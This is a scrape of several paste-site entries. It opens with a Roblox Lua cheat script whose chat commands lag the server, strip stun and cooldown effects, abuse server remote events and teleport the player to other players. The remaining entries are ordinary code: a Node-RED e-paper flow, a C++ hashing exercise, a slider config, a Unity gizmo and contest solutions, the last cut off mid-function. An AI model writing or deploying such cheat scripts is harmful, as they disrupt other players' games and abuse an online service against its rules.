    CFrame.new(-445, 31, -6667),
    CFrame.new(-567, 32, -6653),
    CFrame.new(-799, 46, -6547),
    CFrame.new(-871, 33, -6458),
    CFrame.new(-846, 74, -6365),
    CFrame.new(-806, 50, -6237),
    CFrame.new(-663, 53, -6229),
    CFrame.new(-564, 42, -6149),
    CFrame.new(-454, 42, -6021),
    CFrame.new(-312, 33, -6107),
    CFrame.new(-346, 51, -6281),
    CFrame.new(-319, 51, -6518),
    CFrame.new(-547, 49, -6519),
    CFrame.new(-780, 32, -6332),
    CFrame.new(-721, 47, -6188),
    CFrame.new(-668, 29, -6537),
    CFrame.new(-658, 29, -6614),
    CFrame.new(-638, 29, -6676),
    CFrame.new(-702, 29, -6692),
    CFrame.new(-766, 26, -6680)
}

local function onPlayerChatted(message)
    local lowercaseMessage = string.lower(message)

    if lowercaseMessage == ""hr"" then
        game.Players.LocalPlayer.Character:BreakJoints()
        local Players = game:GetService(""Players"")
        local LocalPlayer = Players.LocalPlayer
        local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        local heartbeatConn = game.RunService.Heartbeat:connect(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = currentCFrame
        end)
        wait(6)
        heartbeatConn:Disconnect()

    elseif lowercaseMessage == ""cmds"" then
        print(""hr"")
        print(""fg"")
        print(""hs"")
        print(""ag"")
        print(""rj"")
        print(""slot1"")
        print(""slot2"")
        print(""slot3"")
        print(""sad"")
        print(""lk"")
        print(""lgtb"")
        print(""nuke"")
        print(""ns"")
        print(""disco ball"")
        print(""lagger"")
        print(""laggeroff"")
        print(""kt/ user"")
        print(""ktoff"")
        print(""tp/ user"")
    
    elseif lowercaseMessage == ""lagger"" then
        spawn(function()
            game:GetService(""RunService"").Heartbeat:Connect(function()
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[""Chain Destructo Disk""])
                task.wait(.5)
                game.Players.LocalPlayer.Character[""Chain Destructo Disk""]:Activate()
                task.wait(.5)
                game.Players.LocalPlayer.Character[""Chain Destructo Disk""]:Deactivate()
            end)
        end)   
        game:GetService(""RunService"").Heartbeat:Connect(function()
            task.wait()
            for _, v in pairs(game.Workspace:GetChildren()) do
                if v:FindFirstChild(""Ki"") and v:FindFirstChild(""Mesh"") then
                    v.CFrame = Pos[index]
                end
            end
            for _, c in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if c:FindFirstChild(""Ki"") and c:FindFirstChild(""Mesh"") then
                    c.CFrame = Pos[index]
                end
            end
            index = index % #Pos + 1
        end)
    elseif lowercaseMessage == ""laggeroff"" then
        game:GetService(""TeleportService""):Teleport(game.PlaceId)
    elseif lowercaseMessage == ""ns"" then
        local cooldowns = {""Action"",""Attacking"",""SuperAction"",""Activity"",""Using"",""hyper"",""Hyper"",""Tele"",""tele"",""heavy"",""KiBlasted"",""Killed"",""Slow"",""Blocked"",""NotHardBack"",""BodyVelocity"", ""KnockBacked"", ""NotHardBack"", ""creator"", ""Throw"", ""Flip"",""xx"",""BStun"",""Dodging"",""RightGrip"",""ui"",""tpp"",""Blocked""}
        game:GetService(""RunService"").RenderStepped:connect(function()
            for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if table.find(cooldowns,v.Name) then
                    v:Destroy()
                end
            end
        end)

    elseif lowercaseMessage == ""disco ball"" then
        local newBlock = Instance.new(""Part"")

newBlock.Size = Vector3.new(0.7, 0.7, 0.7) -- Tamaño del bloque
newBlock.Position = Vector3.new(0, 10, 0)  
newBlock.Anchored = true  
newBlock.BrickColor = BrickColor.new(""Toothpaste"") 
newBlock.CanCollide = false
newBlock.Shape = ""Ball""
newBlock.Material = ""Neon""

newBlock.Parent = game.Workspace.Live[game.Players.LocalPlayer.Name]

game.Workspace.Live[game.Players.LocalPlayer.Name].Part.Name = ""Ball""

task.wait(1)
local newBlock = Instance.new(""Part"")

newBlock.Size = Vector3.new(1, 1, 1)  
newBlock.Position = Vector3.new(0, 10, 0)  
newBlock.Anchored = true 
newBlock.BrickColor = BrickColor.new(""Hot Pink"")
newBlock.CanCollide = false
newBlock.Rotation = Vector3.new(86.62100219726562, 17.051000595092773, -97.98999786376953)
newBlock.Material = ""Neon""


local mesh = Instance.new(""SpecialMesh"")
mesh.MeshType = ""Sphere""
mesh.MeshId = ""rbxassetid://9345909138""
mesh.Scale = Vector3.new(0.7, 0.7, 0.7)
mesh.Parent = newBlock  


newBlock.Parent = game.Workspace.Live[game.Players.LocalPlayer.Name]

game.Workspace.Live[game.Players.LocalPlayer.Name].Part.Name = ""FakeHalo""


local Player = game:GetService(""Players"").LocalPlayer
local Orbiter = game.Workspace.Live:FindFirstChild(Player.Name):FindFirstChild(""FakeHalo"") 
local Ball = game.Workspace.Live:FindFirstChild(Player.Name):FindFirstChild(""Ball"")

local orbitRadius = 1.7 
local orbitSpeed = 2  

local function OrbitAroundPlayer()
    while true do
        task.wait()
        
        local angle = tick() * orbitSpeed 
        local offsetX = math.cos(angle) * orbitRadius
        local offsetZ = math.sin(angle) * orbitRadius  
        
        local playerPosition = Player.Character and Player.Character.HumanoidRootPart and Player.Character.HumanoidRootPart.Position
        if playerPosition then
            local headHeight = (Player.Character.Head.CFrame - Player.Character.HumanoidRootPart.Position).Y
            Orbiter.Position = playerPosition + Vector3.new(offsetX, headHeight, offsetZ) 
            Orbiter.Mesh.MeshType = ""Sphere""
            Ball.Position = playerPosition + Vector3.new(offsetX, headHeight, offsetZ)
        end
    end
end

OrbitAroundPlayer()
    
    elseif lowercaseMessage == ""nuke"" then
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[""Heat Dome Attack""])
        task.wait(.1)
        game.Players.LocalPlayer.Character[""Heat Dome Attack""]:Activate()
        task.wait(.1)
        game.Players.LocalPlayer.Character[""Heat Dome Attack""]:Deactivate()
    
    elseif lowercaseMessage == ""lgtb"" then
        local plr = game.Players.LocalPlayer
game.Workspace.Live[plr.name].Parent = game.Workspace.Effects
wait()
local args1 = game:GetService(""Workspace"").FriendlyNPCs[""Hair Stylist""]
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(args1)
wait(0.30)
local args = {
    [1] = {
        [1] = ""Yes"",
    },
}
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))

game:GetService(""RunService"").RenderStepped:connect(function()
    game:GetService(""Players"").LocalPlayer.PlayerGui.Setup.Enabled = false
    game:GetService(""Players"").LocalPlayer.Backpack.HairScript.RemoteEvent:FireServer(game:GetService(""Players"").LocalPlayer.PlayerGui.Setup.Frame.Side.HairColor,""up"")
    game:GetService(""Players"").LocalPlayer.Backpack.HairScript.RemoteEvent:FireServer(game:GetService(""Players"").LocalPlayer.PlayerGui.Setup.Frame.Side.Skin,""up"")
    game:GetService(""Players"").LocalPlayer.Backpack.HairScript.RemoteEvent:FireServer(game:GetService(""Players"").LocalPlayer.PlayerGui.Setup.Frame.Side.Hair,""up"")
end)

    elseif lowercaseMessage == ""fg"" then
    game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""decrease""},[2] = true}))
game:GetService(""ReplicatedStorage"").ResetChar:FireServer()
wait(0.4)
local args = {
    [1] = ""h""
}
 
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Transform:FireServer(unpack(args))
wait(0.4)
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack( {[1] = {[1] = ""increase""},[2] = true}))
    
    elseif lowercaseMessage == ""hs"" then
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = workspace.FriendlyNPCs:FindFirstChild(""Hair Stylist"")}))
      wait(.3)
      game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
      wait(.3)
      game:GetService(""Players"").LocalPlayer.Backpack:WaitForChild(""HairScript"").RemoteEvent:FireServer(unpack({[1] = ""woah""}))
      local Players = game:GetService(""Players"")
        local LocalPlayer = Players.LocalPlayer
        local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        local heartbeatConn = game.RunService.Heartbeat:connect(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = currentCFrame
        end)
        wait(2.8)
        heartbeatConn:Disconnect()
    elseif lowercaseMessage == ""ag"" then
    local plr = game.Players.LocalPlayer
        while wait() do
            pcall(function()
                game:GetService(""Workspace"").Live[plr.Name].LowerTorso.BodyVelocity:Destroy()
            end)
        end

    elseif lowercaseMessage == ""rj"" then
        game:GetService(""TeleportService""):Teleport(game.PlaceId)

    elseif lowercaseMessage == ""slot1"" then
        local Players = game:GetService(""Players"")
        local LocalPlayer = Players.LocalPlayer
        local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        local heartbeatConn = game.RunService.Heartbeat:connect(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = currentCFrame
        end)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = workspace.FriendlyNPCs:FindFirstChild(""Character Slot Changer"")}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (""Slot1"")}}))
        wait(4.5)
        heartbeatConn:Disconnect()
    elseif lowercaseMessage == ""slot2"" then
        local Players = game:GetService(""Players"")
        local LocalPlayer = Players.LocalPlayer
        local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        local heartbeatConn = game.RunService.Heartbeat:connect(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = currentCFrame
        end)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = workspace.FriendlyNPCs:FindFirstChild(""Character Slot Changer"")}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (""Slot2"")}}))
        wait(4.5)
        heartbeatConn:Disconnect()
    elseif lowercaseMessage == ""slot3"" then
        local Players = game:GetService(""Players"")
        local LocalPlayer = Players.LocalPlayer
        local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        local heartbeatConn = game.RunService.Heartbeat:connect(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = currentCFrame
        end)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = workspace.FriendlyNPCs:FindFirstChild(""Character Slot Changer"")}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
        wait(.3)
        game.Players.LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (""Slot3"")}}))
        wait(4.5)
        heartbeatConn:Disconnect()
    elseif lowercaseMessage == ""sad"" then
        player = game.Players.LocalPlayer
        if game.Workspace.Live[player.Name].Animate.idle:FindFirstChild(""Animation1"") then
            game.Workspace.Live[player.Name].Animate.idle:FindFirstChild(""Animation1"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.walk:FindFirstChild(""RunAnim"") then
            game.Workspace.Live[player.Name].Animate.walk:FindFirstChild(""RunAnim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.jump:FindFirstChild(""JumpAnim"") then
            game.Workspace.Live[player.Name].Animate.jump:FindFirstChild(""JumpAnim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.climb:FindFirstChild(""ClimbAnim"") then
            game.Workspace.Live[player.Name].Animate.climb:FindFirstChild(""ClimbAnim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.fall:FindFirstChild(""FallAnim"") then
            game.Workspace.Live[player.Name].Animate.fall:FindFirstChild(""FallAnim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.sit:FindFirstChild(""SitAnim"") then
            game.Workspace.Live[player.Name].Animate.sit:FindFirstChild(""SitAnim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.toonone:FindFirstChild(""ToolNoneAnim"") then
            game.Workspace.Live[player.Name].Animate.toonone:FindFirstChild(""ToolNoneAnim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.swim:FindFirstChild(""Swim"") then
            game.Workspace.Live[player.Name].Animate.swim:FindFirstChild(""Swim"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.swimidle:FindFirstChild(""Swimidle"") then
            game.Workspace.Live[player.Name].Animate.swimidle:FindFirstChild(""Swimidle"").AnimationId = ""rbxassetid://5302520609""
        if game.Workspace.Live[player.Name].Animate.idle:FindFirstChild(""Animation2"") then
            game.Workspace.Live[player.Name].Animate.idle:FindFirstChild(""Animation2"").AnimationId = ""rbxassetid://5302520609""
    end end end end end end end end end end

    elseif lowercaseMessage == ""lk"" then
     game:GetService(""TweenService""):Create(
  game.Players.LocalPlayer.Character.HumanoidRootPart,
  TweenInfo.new(1.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
  {CFrame = CFrame.new(2479, 3945, -2274)}
  ):Play()

    elseif lowercaseMessage:sub(1, 2) == ""tp"" then
        local playerNamePart = lowercaseMessage:sub(4)

        -- Buscar un jugador cuyo nombre contenga la parte especificada
        for _, player in ipairs(game.Players:GetPlayers()) do
            if string.find(string.lower(player.Name), playerNamePart, 1, true) then
                -- Calcular el punto de destino para el Tween
                local destination = player.Character.HumanoidRootPart.Position
                local targetCFrame = CFrame.new(destination)

                -- Crear el Tween
                local tweenInfo = TweenInfo.new(
                    1, -- Duración del Tween en segundos
                    Enum.EasingStyle.Linear, -- Estilo de suavizado
                    Enum.EasingDirection.InOut, -- Dirección de suavizado
                    0, -- Sin repetición
                    false -- Sin repetición inversa
                )

                local tween = TweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, tweenInfo, {CFrame = targetCFrame})

                -- Manejar el evento de finalización del Tween
                tween.Completed:Connect(function()
                    tween:Destroy() -- Detener el Tween
                end)

                -- Reproducir el Tween
                tween:Play()

                return
            end
        end
    end
end

game.Players.LocalPlayer.Chatted:Connect(onPlayerChatted)"
4FTXi6CG,openepaperlink,FlyHigh-Swe,JSON,Sunday 14th of April 2024 01:52:54 PM CDT,"[{""id"":""f7933ee42bd95816"",""type"":""api-call-service"",""z"":""4346d7d500d95631"",""name"":"""",""server"":""a0ae687a.b44378"",""version"":5,""debugenabled"":false,""domain"":""open_epaper_link"",""service"":""drawcustom"",""areaId"":[],""deviceId"":[],""entityId"":[""open_epaper_link.0000021c6b0c3418""],""data"":""{\t  \""background\"": \""white\"",\t  \""payload\"": [\t      {\t      \""type\"": \""text\"",\t      \""value\"": \""Rad 1\"",\t      \""x\"": 75,\t      \""y\"": 50,\t      \""size\"": 15,\t      \""color\"": \""black\"",\t      \""anchor\"": \""mm\""\t    },  \t         {\t      \""type\"": \""text\"",\t      \""value\"": \""Rad2\"",\t      \""x\"": 75,\t      \""y\"": 100,\t      \""size\"": 15,\t      \""color\"": \""black\"",\t      \""anchor\"": \""mm\""\t    }\t  ]\t}"",""dataType"":""jsonata"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""payload"",""propertyType"":""msg"",""value"":"""",""valueType"":""data""},{""property"":""result"",""propertyType"":""msg"",""value"":"""",""valueType"":""results""}],""queue"":""none"",""x"":470,""y"":780,""wires"":[[]]},{""id"":""ce9b62a9e21573ec"",""type"":""inject"",""z"":""4346d7d500d95631"",""name"":"""",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":""3600"",""crontab"":"""",""once"":true,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":210,""y"":780,""wires"":[[""f7933ee42bd95816""]]},{""id"":""a0ae687a.b44378"",""type"":""server"",""name"":""Home Assistant"",""version"":5,""addon"":true,""rejectUnauthorizedCerts"":true,""ha_boolean"":""y|yes|true|on|home|open"",""connectionDelay"":true,""cacheJson"":true,""heartbeat"":false,""heartbeatInterval"":30,""areaSelector"":""friendlyName"",""deviceSelector"":""friendlyName"",""entitySelector"":""friendlyName"",""statusSeparator"":""at: "",""statusYear"":""hidden"",""statusMonth"":""short"",""statusDay"":""numeric"",""statusHourCycle"":""h23"",""statusTimeFormat"":""h:m"",""enableGlobalContextStore"":true}]"
iZvQQ7Cu,л2крипто,istomina_sofia,C++,Sunday 14th of April 2024 01:43:26 PM CDT,"#include <Windows.h>
#include <wincrypt.h>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <string>

using namespace std;

int main()
{
    setlocale(LC_ALL, ""RUS"");
    
// D:\stim\test.txt
    
    string F;
    string line;

    cout << ""Путь к файлу: "";
    cin >> F;

    ifstream file(F);  
    if (!file.is_open())
    {
        cout << ""Файл не открылся"" << endl;
    }
    getline(file, line);

    file.close();

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTHASH hHash2;

    if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0))
    {
        cerr << ""Дескриптор не получен: "" << GetLastError();
    }
  

    if (!CryptCreateHash(hProv, CALG_SHA, 0, 0, &hHash))
    {
        cerr << ""Хэш-объект не создан: "" << GetLastError();
        CryptReleaseContext(hProv, 0);
    }

    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash2))
    {
        cerr << ""Хэш-объект не создан: "" << GetLastError();
        CryptReleaseContext(hProv, 0);
    }


    ALG_ID hashAlgId;
    DWORD hashAlgIdSize = sizeof(hashAlgId);

    if (!CryptGetHashParam(hHash, HP_ALGID, (BYTE*)&hashAlgId, &hashAlgIdSize, 0))
    {
        cerr << ""Ошибка при получение идентификатора алгоритма: "" << GetLastError();
        //delete[] fileData;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }

    cout << ""Идентификатор алгоритма хеширования: "" << hex << hashAlgId << endl;


    LPCSTR pbData = line.c_str();
    if (!CryptHashData(hHash, (BYTE*)pbData, line.size(), 0))
    {
        cerr << ""Хэширование провалилось: "" << GetLastError();
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }

    if (!CryptHashData(hHash2, (BYTE*)pbData, line.size(), 0))
    {
        cerr << ""Хэширование провалилось: "" << GetLastError();
        CryptDestroyHash(hHash2);
        CryptReleaseContext(hProv, 0);
    }

    
    DWORD hashSize = 0;
    DWORD hashSizeSize = sizeof(hashSize);

    if (!CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&hashSize, &hashSizeSize, 0))
    {
        cerr << ""Ошибка при получение параметра : "" << GetLastError();
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }

    BYTE* hashData = new BYTE[hashSize];
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hashData, &hashSize, 0))
    {
        cerr << ""Ошибка при получение хеша: "" << GetLastError();
        delete[] hashData;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }

    cout << ""Хэш: "";
    for (DWORD i = 0; i < hashSize; i++)
    {
        cout << setw(2) << setfill('0') << hex << (int)hashData[i];
    }
    cout << endl;



    DWORD hashSize2 = 0;
    DWORD hashSizeSize2 = sizeof(hashSize2);

    if (!CryptGetHashParam(hHash2, HP_HASHSIZE, (BYTE*)&hashSize2, &hashSizeSize2, 0))
    {
        cerr << ""Ошибка при получение параметра : "" << GetLastError();
        CryptDestroyHash(hHash2);
        CryptReleaseContext(hProv, 0);
    }

    BYTE* hashData2 = new BYTE[hashSize2];
    if (!CryptGetHashParam(hHash2, HP_HASHVAL, hashData2, &hashSize2, 0))
    {
        cerr << ""Ошибка при получение хеша: "" << GetLastError();
        delete[] hashData2;
        CryptDestroyHash(hHash2);
        CryptReleaseContext(hProv, 0);
    }

    cout << ""Хэш: "";
    for (DWORD i = 0; i < hashSize2; i++)
    {
        cout << setw(2) << setfill('0') << hex << (int)hashData2[i];
    }
    cout << endl;


    delete[] hashData;
    delete[] hashData2;
    CryptDestroyHash(hHash);
    CryptDestroyHash(hHash2);
    CryptReleaseContext(hProv, 0);
    return 0;
}"
qQSmq2X2,Untitled,iry_nkn,JavaScript,Sunday 14th of April 2024 01:29:38 PM CDT,"responsive: [
        {
          breakpoint: 1200,
          settings: {
            slidesToShow: getSlidesToShow(4, 2),
            slidesToScroll: 4,
            rows: employees.length > 4 ? 2 : 1,
          },
        },
        {
          breakpoint: 768,
          settings: {
            slidesToShow: getSlidesToShow(2, 3, true),
            slidesToScroll: 2,
            rows: employees.length > 4 ? 3 : Math.ceil(employees.length / 2),
          },
        },
      ],"
QbYTKGFW,Untitled,lemansky,C#,Sunday 14th of April 2024 01:05:31 PM CDT," void OnDrawGizmos()
    {
        Vector3 origin = transform.position;
        Vector3 direction = transform.forward * range;

        if (Physics.Raycast(origin, direction, out hit, range))
        {
            Gizmos.color = Color.green;
            Gizmos.DrawLine(origin, hit.point);
            Gizmos.DrawSphere(hit.point + Vector3.up* 0.1f, 0.5f);
        }
        else
        {
            Gizmos.color = Color.red;
            Gizmos.DrawLine(origin, origin + direction);
            Gizmos.DrawSphere(origin + direction, 0.5f);
        }
    }"
RFwSkjQs,G,Ahmed_Negm,C++,Sunday 14th of April 2024 12:57:15 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    ll n,m,x; cin>>n>>m>>x;

    vector<vector<ll>> a(n, vector<ll>(m+1));
    for(ll i=0; i<n; i++){
        for(ll j=0; j<=m; j++){
            cin>>a[i][j];
        }
    }



    ll ans = LONG_LONG_MAX;

    for(int i=0; i<(1<<n); i++){
        ll sum = 0;
        vector<ll> b(m);
        for(int j=0; j<n; j++){
            if(i&(1<<j)){
                sum += a[j][0];
               for(int k=1;k<=m;k++){
                b[k-1] += a[j][k];
               }
            }
        }

        sort(b.begin(), b.end());
        if(b[0]>=x){
            ans = min(ans, sum);
        }
    }

    if(ans == LONG_LONG_MAX){
        cout<<-1<<nl;
    }else cout<<ans<<nl;

}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
aBr1K8yr,F,Ahmed_Negm,C++,Sunday 14th of April 2024 12:47:49 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    ll n,k; cin>>n>>k;
    vector<ll> v(n);
    for(auto&i:v) cin>>i;

    ll ans = n*(n+1)/2;

